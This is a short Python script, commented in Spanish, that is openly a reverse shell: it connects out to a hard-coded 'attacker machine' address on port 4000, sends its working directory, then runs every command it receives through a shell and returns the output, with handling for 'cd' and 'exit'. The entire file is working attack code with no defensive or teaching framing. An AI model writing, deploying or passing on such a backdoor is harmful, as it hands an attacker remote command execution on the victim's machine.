import socket
import os
import subprocess
from pip._vendor.distlib.compat import raw_input 
ip_atacante = '192.168.0.100' #ip de la maquina atacante
puerto = 4000
def shell():
    currentDir = os.getcwd()
    servidor.send(currentDir.encode())
    while True:
        res = servidor.recv(1024).decode()
        
        if res == 'exit':
            break
        elif res[:2] == 'cd' and len(res) > 2:
            if res[3:] == '':
                pass
            else:
               
                os.chdir(res[3:])
                resultado = os.getcwd()
                servidor.send(resultado.encode())
        else:
            proceso = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            resultado = proceso.stdout.read() + proceso.stderr.read()
            if len(resultado) == 0:
                servidor.send('recivido'.encode())
            else:
                servidor.send(resultado)


servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
servidor.connect((ip_atacante, puerto))
shell()
servidor.close()
